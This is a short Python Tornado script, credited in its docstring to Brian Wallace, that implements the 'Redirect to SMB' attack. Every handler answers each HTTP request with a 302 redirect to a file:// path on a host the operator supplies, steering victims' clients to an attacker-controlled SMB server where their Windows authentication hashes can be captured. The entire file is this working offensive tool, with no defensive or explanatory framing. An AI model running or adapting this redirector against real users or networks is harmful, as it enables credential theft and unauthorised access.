import tornado.ioloop
import tornado.web
import string
import random

"""
This script redirects all requests to a SMB server (Redirect to SMB)
Developed by Brian Wallace @botnet_hutner
"""


class RedirectAll(tornado.web.RequestHandler):
    def get(self):
        self.set_status(302, "Found")
        self.redirect("file://{0}/redirected-{1}".format(sys.argv[1], ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))))

    def post(self):
        self.set_status(302, "Found")
        self.redirect("file://{0}/redirected-{1}".format(sys.argv[1], ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))))

    def head(self):
        self.set_status(302, "Found")
        self.redirect("file://{0}/redirected-{1}".format(sys.argv[1], ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))))

    def options(self):
        self.set_status(302, "Found")
        self.redirect("file://{0}/redirected-{1}".format(sys.argv[1], ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))))

    def put(self):
        self.set_status(302, "Found")
        self.redirect("file://{0}/redirected-{1}".format(sys.argv[1], ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))))

application = tornado.web.Application([
    (r".*", RedirectAll),
])

if __name__ == "__main__":
    import sys
    port = 8080
    if len(sys.argv) > 2:
        port = int(sys.argv[2])

    application.listen(port)
    tornado.ioloop.IOLoop.instance().start()